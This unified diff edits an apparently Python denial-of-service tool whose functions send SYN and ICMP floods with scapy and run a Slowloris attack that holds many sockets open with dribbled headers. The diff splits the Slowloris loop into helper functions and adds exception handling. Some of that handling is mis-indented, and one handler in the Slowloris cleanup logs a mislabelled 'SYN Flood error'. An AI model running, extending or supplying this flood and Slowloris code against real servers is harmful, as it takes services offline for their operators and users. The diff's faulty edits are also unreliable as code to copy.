@@ -5,7 +5,7 @@ import ssl
 import time
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from urllib.parse import urlparse
-
+import scapy.error
 from colorama import init
 from rich.logging import RichHandler
 from scapy.all import ICMP, IP, TCP, send
@@ -61,6 +61,8 @@ def syn_flood(target_ip, target_port, count=100):
 
             if (i + 1) % report_every == 0 or i == count - 1:
                 log.info(f"SYN FLOOD - Sent {sent}/{count} packets")
+        except (socket.timeout, socket.error, scapy.error.Scapy_Exception) as e:
+            log.error(f"SYN Flood error: {e}")
         except Exception as e:
             log.error(f"SYN Flood error: {e}")
 
@@ -102,6 +104,8 @@ def icmp_flood(target_ip, count=100):
 
             if (i + 1) % report_every == 0 or i == count - 1:
                 log.info(f"ICMP FLOOD - Sent {sent}/{count} packets")
+        except (socket.timeout, socket.error, scapy.error.Scapy_Exception) as e:
+                    log.error(f"ICMP Flood error: {e}")
         except Exception as e:
             log.error(f"ICMP Flood error: {e}")
 
@@ -127,37 +131,45 @@ def create_socket(target_host, target_port, idx, sockets, log):
         log.critical(f"SLOWLORIS - Unexpected error for {idx}: {e}")
     return False
 
+def replenish_sockets(sockets, target_host, target_port, num_sockets, log):
+    current_count = len(sockets)
+    if current_count < num_sockets:
+        for idx in range(current_count, num_sockets):
+            if create_socket(target_host, target_port, idx, sockets, log):
+                log.info(f"SLOWLORIS - Replenished socket {idx+1}/{num_sockets}")
+
+def send_on_sockets(sockets, log):
+    dead_sockets = []
+    for s in sockets:
+        try:
+            s.send(b"X-a: b\r\n")
+        except (socket.timeout, socket.error):
+            dead_sockets.append(s)
+        except Exception as e:
+            log.error(f"SLOWLORIS - Send error: {e}")
+            dead_sockets.append(s)
+    return dead_sockets
+
+def cleanup_sockets(dead_sockets, sockets):
+    for s in dead_sockets:
+        if s in sockets:
+            sockets.remove(s)
+            try:
+                s.close()
+            except:
+                pass
 
 def maintain_sockets(sockets, target_host, target_port, num_sockets, log):
     pkt_count = 0
     report_every = max(1, num_sockets // 5)
-
     while sockets:
-        current_count = len(sockets)
-        if current_count < num_sockets:
-            for idx in range(current_count, num_sockets):
-                if create_socket(target_host, target_port, idx, sockets, log):
-                    log.info(f"SLOWLORIS - Replenished socket {idx+1}/{num_sockets}")
+        replenish_sockets(sockets, target_host, target_port, num_sockets, log)
 
         pkt_count += 1
-        dead_sockets = []
 
-        for s in sockets:
-            try:
-                s.send(b"X-a: b\r\n")
-            except (socket.timeout, socket.error):
-                dead_sockets.append(s)
-            except Exception as e:
-                log.error(f"SLOWLORIS - Send error: {e}")
-                dead_sockets.append(s)
+        dead_sockets = send_on_sockets(sockets, log)
 
-        for s in dead_sockets:
-            if s in sockets:
-                sockets.remove(s)
-                try:
-                    s.close()
-                except:
-                    pass
+        cleanup_sockets(dead_sockets, sockets)
 
         if pkt_count % report_every == 0 or pkt_count == 1:
             active = len(sockets)
@@ -188,8 +200,8 @@ def slowloris_attack(target_host, target_port, num_sockets=50):
         for s in sockets:
             try:
                 s.close()
-            except:
-                pass
+            except (socket.timeout, socket.error, scapy.error.Scapy_Exception) as e:
+                        log.error(f"SYN Flood error: {e}")
         log.info(f"Slowloris attack finished on {target_host}:{target_port}")
 
 
